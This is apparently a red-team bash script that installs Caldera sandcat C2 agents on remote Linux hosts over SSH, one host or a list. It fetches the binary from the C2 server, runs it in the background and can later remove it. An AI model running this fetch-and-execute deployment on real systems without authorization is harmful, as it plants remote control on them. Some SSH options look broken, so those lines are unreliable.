#!/usr/bin/env bash
# =============================================================================
# Caldera Sandcat Agent Deployer for Linux Hosts
# Deploys sandcat agents to remote Linux hosts via SSH
# =============================================================================
set -euo pipefail

# --- Configuration ---
CALDERA_PORT="${CALDERA_PORT:-8888}"
CALDERA_API_KEY="${CALDERA_API_KEY:-<API_KEY>}"
REMOTE_INSTALL_DIR="/opt/caldera-agent"
REMOTE_BINARY="sandcat.exe"
AGENT_PROCESS_NAME="sandcat.exe"
API_CONFIRM_RETRIES=12
API_CONFIRM_INTERVAL=5

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# --- Logging helpers ---
info()    { echo -e "${BLUE}[INFO]${NC}  $*"; }
success() { echo -e "${GREEN}[OK]${NC}    $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
error()   { echo -e "${RED}[ERROR]${NC} $*"; }
header()  { echo -e "\n${BOLD}${CYAN}=== $* ===${NC}"; }

# --- Resolve Caldera server IP ---
resolve_caldera_ip() {
    if [[ -n "${CALDERA_SERVER:-}" ]]; then
        echo "$CALDERA_SERVER"
        return
    fi
    local ip
    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    if [[ -z "$ip" ]]; then
        error "Could not determine local IP. Set CALDERA_SERVER env variable."
        exit 1
    fi
    echo "$ip"
}

# --- Usage ---
usage() {
    cat <<EOF
${BOLD}Caldera Sandcat Agent Deployer${NC}

${BOLD}USAGE${NC}
  $(basename "$0") [OPTIONS] <target>
  $(basename "$0") --hostfile <file> [OPTIONS]

${BOLD}ARGUMENTS${NC}
  <target>              Target IP or hostname

${BOLD}OPTIONS${NC}
  -u, --user USER       SSH user (default: root)
  -p, --port PORT       SSH port (default: 22)
  -P, --password PASS   SSH password (uses sshpass; omit for key-based auth)
  -g, --group GROUP     Caldera agent group (default: claude)
  -f, --hostfile FILE   Deploy to multiple hosts listed in FILE
                        Format per line: IP,user,port,password
                        user/port/password are optional (defaults apply)
  -s, --server IP       Caldera server IP (default: auto-detect via hostname -I)
      --remove          Remove agent from target(s) instead of deploying
  -h, --help            Show this help

${BOLD}ENVIRONMENT${NC}
  CALDERA_SERVER        Override Caldera server IP
  CALDERA_PORT          Override Caldera port (default: 8888)
  CALDERA_API_KEY       Override Caldera API key

${BOLD}EXAMPLES${NC}
  # Deploy with SSH key auth
  $(basename "$0") 10.0.0.50

  # Deploy with password
  $(basename "$0") -u admin -P 's3cret' 10.0.0.50

  # Deploy to a list of hosts
  $(basename "$0") --hostfile targets.txt -g red-team

  # Remove agent from a host
  $(basename "$0") --remove 10.0.0.50

${BOLD}HOSTFILE FORMAT${NC}
  # One host per line: IP,user,port,password
  10.0.0.50
  10.0.0.51,admin
  10.0.0.52,deploy,2222
  10.0.0.53,deploy,22,s3cret
EOF
}

# --- SSH wrapper ---
# Builds the ssh/sshpass command array and runs a command on the remote host.
# Globals used: SSH_USER, SSH_PORT, SSH_PASS
run_ssh() {
    local target="$1"
    shift
    local -a cmd=()

    if [[ -n "${SSH_PASS:-}" ]]; then
        if ! command -v sshpass &>/dev/null; then
            error "sshpass is required for password-based SSH but is not installed."
            error "Install it:  apt-get install sshpass  |  yum install sshpass"
            return 1
        fi
        cmd+=(sshpass -p "$SSH_PASS")
    fi

    cmd+=(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
              -o BatchMode="${SSH_PASS:+no}"
              -o BatchMode="${SSH_PASS:-yes}"
              -p "$SSH_PORT" "${SSH_USER}@${target}")
    cmd+=("$@")

    "${cmd[@]}"
}

# --- SCP wrapper ---
run_scp() {
    local target="$1" src="$2" dest="$3"
    local -a cmd=()

    if [[ -n "${SSH_PASS:-}" ]]; then
        cmd+=(sshpass -p "$SSH_PASS")
    fi

    cmd+=(scp -o StrictHostKeyChecking=no -o ConnectTimeout=10
              -P "$SSH_PORT" "$src" "${SSH_USER}@${target}:${dest}")

    "${cmd[@]}"
}

# --- Deploy agent to a single host ---
deploy_to_host() {
    local target="$1"
    local caldera_url="http://${CALDERA_IP}:${CALDERA_PORT}"

    header "Deploying to ${target} (user=${SSH_USER}, port=${SSH_PORT}, group=${GROUP})"

    # 1. Test SSH connectivity
    info "Testing SSH connectivity to ${target}..."
    if ! run_ssh "$target" "echo ok" &>/dev/null; then
        error "Cannot connect to ${target} via SSH."
        return 1
    fi
    success "SSH connection established."

    # 2. Create install directory
    info "Preparing remote install directory ${REMOTE_INSTALL_DIR}..."
    run_ssh "$target" "mkdir -p ${REMOTE_INSTALL_DIR}"
    success "Directory ready."

    # 3. Kill any existing sandcat process
    info "Stopping any existing sandcat agent..."
    run_ssh "$target" "pkill -f '${AGENT_PROCESS_NAME}' 2>/dev/null || true"
    sleep 1
    if run_ssh "$target" "pgrep -f '${AGENT_PROCESS_NAME}'" &>/dev/null; then
        warn "Agent still running, sending SIGKILL..."
        run_ssh "$target" "pkill -9 -f '${AGENT_PROCESS_NAME}' 2>/dev/null || true"
        sleep 1
    fi
    success "No conflicting agent process."

    # 4. Download sandcat binary
    info "Downloading sandcat agent from ${caldera_url}..."
    local dl_cmd
    dl_cmd="curl -s -o ${REMOTE_INSTALL_DIR}/${REMOTE_BINARY} \
        -X POST '${caldera_url}/file/download' \
        -H 'platform: linux' \
        -H 'file: sandcat.go' \
        -H 'KEY: ${CALDERA_API_KEY}'"

    if ! run_ssh "$target" "$dl_cmd"; then
        error "Failed to download sandcat binary on ${target}."
        return 1
    fi

    # Verify download produced a non-empty file
    local remote_size
    remote_size=$(run_ssh "$target" "stat -c%s '${REMOTE_INSTALL_DIR}/${REMOTE_BINARY}' 2>/dev/null || echo 0")
    if [[ "$remote_size" -lt 1000 ]]; then
        error "Downloaded binary is too small (${remote_size} bytes). Download likely failed."
        error "Verify Caldera is running at ${caldera_url} and the sandcat payload plugin is enabled."
        return 1
    fi
    success "Agent binary downloaded (${remote_size} bytes)."

    # 5. Make executable
    run_ssh "$target" "chmod +x ${REMOTE_INSTALL_DIR}/${REMOTE_BINARY}"

    # 6. Start agent in background
    info "Starting sandcat agent (group=${GROUP})..."
    local start_cmd
    start_cmd="cd ${REMOTE_INSTALL_DIR} && \
        nohup ./${REMOTE_BINARY} -server '${caldera_url}' -group '${GROUP}' \
        </dev/null >${REMOTE_INSTALL_DIR}/sandcat.log 2>&1 &"

    run_ssh "$target" "$start_cmd"
    sleep 2

    # 7. Verify process is running on remote host
    info "Verifying agent process on ${target}..."
    if run_ssh "$target" "pgrep -f '${AGENT_PROCESS_NAME}'" &>/dev/null; then
        success "Agent process is running on ${target}."
    else
        error "Agent process failed to start. Check ${REMOTE_INSTALL_DIR}/sandcat.log on ${target}."
        run_ssh "$target" "tail -5 ${REMOTE_INSTALL_DIR}/sandcat.log 2>/dev/null" || true
        return 1
    fi

    # 8. Check Caldera API for agent registration
    info "Waiting for agent to register with Caldera (up to $((API_CONFIRM_RETRIES * API_CONFIRM_INTERVAL))s)..."
    local registered=false
    for ((i = 1; i <= API_CONFIRM_RETRIES; i++)); do
        local agents_json
        agents_json=$(curl -s -H "KEY: ${CALDERA_API_KEY}" \
            "${caldera_url}/api/v2/agents" 2>/dev/null || echo "[]")

        # Check if any agent's host matches target IP or has the expected host_ip_addrs
        if echo "$agents_json" | python3 -c "
import sys, json
try:
    agents = json.load(sys.stdin)
    for a in agents:
        host_ip = a.get('host_ip_addrs', [])
        host = a.get('host', '')
        if '${target}' in host_ip or host == '${target}':
            if a.get('group', '') == '${GROUP}':
                sys.exit(0)
except Exception:
    pass
sys.exit(1)
" 2>/dev/null; then
            registered=true
            break
        fi
        printf "  Attempt %d/%d...\r" "$i" "$API_CONFIRM_RETRIES"
        sleep "$API_CONFIRM_INTERVAL"
    done

    if $registered; then
        success "Agent on ${target} registered with Caldera (group=${GROUP})."
    else
        warn "Agent process is running but API registration not confirmed."
        warn "This may be normal if the host resolves to a different IP."
        warn "Check the Caldera UI at ${caldera_url} for the new agent."
    fi

    echo ""
    success "Deployment to ${target} complete."
    return 0
}

# --- Remove agent from a single host ---
remove_from_host() {
    local target="$1"

    header "Removing agent from ${target}"

    info "Testing SSH connectivity to ${target}..."
    if ! run_ssh "$target" "echo ok" &>/dev/null; then
        error "Cannot connect to ${target} via SSH."
        return 1
    fi

    info "Stopping sandcat agent..."
    run_ssh "$target" "pkill -9 -f '${AGENT_PROCESS_NAME}' 2>/dev/null || true"
    sleep 1

    info "Removing agent files from ${REMOTE_INSTALL_DIR}..."
    run_ssh "$target" "rm -rf ${REMOTE_INSTALL_DIR}" 2>/dev/null || true

    info "Cleaning up /tmp/sandcat artifacts..."
    run_ssh "$target" "rm -rf /tmp/sandcat* /tmp/.sandcat* /tmp/${REMOTE_BINARY}" 2>/dev/null || true

    if run_ssh "$target" "pgrep -f '${AGENT_PROCESS_NAME}'" &>/dev/null; then
        warn "Agent process may still be running on ${target}."
    else
        success "Agent removed from ${target}."
    fi
    return 0
}

# --- Process a hostfile ---
process_hostfile() {
    local hostfile="$1"
    local action="$2"  # deploy or remove
    local total=0 ok=0 fail=0

    if [[ ! -f "$hostfile" ]]; then
        error "Hostfile not found: ${hostfile}"
        exit 1
    fi

    # Count non-empty, non-comment lines
    total=$(grep -cve '^\s*$' -e '^\s*#' "$hostfile" || echo 0)
    info "Found ${total} host(s) in ${hostfile}"

    while IFS= read -r line; do
        # Skip blank lines and comments
        [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue

        # Parse CSV: IP,user,port,password
        IFS=',' read -r h_ip h_user h_port h_pass <<< "$line"
        h_ip=$(echo "$h_ip" | xargs)       # trim whitespace
        h_user=$(echo "${h_user:-}" | xargs)
        h_port=$(echo "${h_port:-}" | xargs)
        h_pass=$(echo "${h_pass:-}" | xargs)

        # Apply per-host overrides, fall back to CLI defaults
        SSH_USER="${h_user:-${DEFAULT_USER}}"
        SSH_PORT="${h_port:-${DEFAULT_PORT}}"
        SSH_PASS="${h_pass:-${DEFAULT_PASS}}"

        if [[ "$action" == "remove" ]]; then
            if remove_from_host "$h_ip"; then
                ((ok++))
            else
                ((fail++))
            fi
        else
            if deploy_to_host "$h_ip"; then
                ((ok++))
            else
                ((fail++))
            fi
        fi
    done < "$hostfile"

    echo ""
    header "Summary"
    info "Total: ${total}  |  ${GREEN}Success: ${ok}${NC}  |  ${RED}Failed: ${fail}${NC}"
}

# =============================================================================
# Main
# =============================================================================

# Defaults
DEFAULT_USER="root"
DEFAULT_PORT="22"
DEFAULT_PASS=""
GROUP="claude"
HOSTFILE=""
REMOVE_MODE=false
TARGET=""
CALDERA_SERVER_OVERRIDE=""

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--help)
            usage
            exit 0
            ;;
        -u|--user)
            DEFAULT_USER="$2"; shift 2 ;;
        -p|--port)
            DEFAULT_PORT="$2"; shift 2 ;;
        -P|--password)
            DEFAULT_PASS="$2"; shift 2 ;;
        -g|--group)
            GROUP="$2"; shift 2 ;;
        -f|--hostfile)
            HOSTFILE="$2"; shift 2 ;;
        -s|--server)
            CALDERA_SERVER_OVERRIDE="$2"; shift 2 ;;
        --remove)
            REMOVE_MODE=true; shift ;;
        -*)
            error "Unknown option: $1"
            echo "Run '$(basename "$0") --help' for usage."
            exit 1
            ;;
        *)
            TARGET="$1"; shift ;;
    esac
done

# Validate inputs
if [[ -z "$TARGET" && -z "$HOSTFILE" ]]; then
    error "No target specified. Provide a host or --hostfile."
    echo ""
    usage
    exit 1
fi

# Resolve Caldera server IP
if [[ -n "$CALDERA_SERVER_OVERRIDE" ]]; then
    CALDERA_SERVER="$CALDERA_SERVER_OVERRIDE"
fi
CALDERA_IP=$(resolve_caldera_ip)

header "Caldera Sandcat Agent Deployer"
info "Caldera server: ${CALDERA_IP}:${CALDERA_PORT}"
info "API key:        ${CALDERA_API_KEY:0:8}...${CALDERA_API_KEY: -4}"
info "Agent group:    ${GROUP}"
info "Install dir:    ${REMOTE_INSTALL_DIR}"
if $REMOVE_MODE; then
    info "Mode:           ${RED}REMOVE${NC}"
else
    info "Mode:           ${GREEN}DEPLOY${NC}"
fi

# Set SSH variables for single-host mode
SSH_USER="$DEFAULT_USER"
SSH_PORT="$DEFAULT_PORT"
SSH_PASS="$DEFAULT_PASS"

# Execute
if [[ -n "$HOSTFILE" ]]; then
    if $REMOVE_MODE; then
        process_hostfile "$HOSTFILE" "remove"
    else
        process_hostfile "$HOSTFILE" "deploy"
    fi
elif [[ -n "$TARGET" ]]; then
    if $REMOVE_MODE; then
        remove_from_host "$TARGET"
    else
        deploy_to_host "$TARGET"
    fi
fi

exit_code=$?
if [[ $exit_code -eq 0 ]]; then
    echo ""
    success "All done."
fi
exit $exit_code
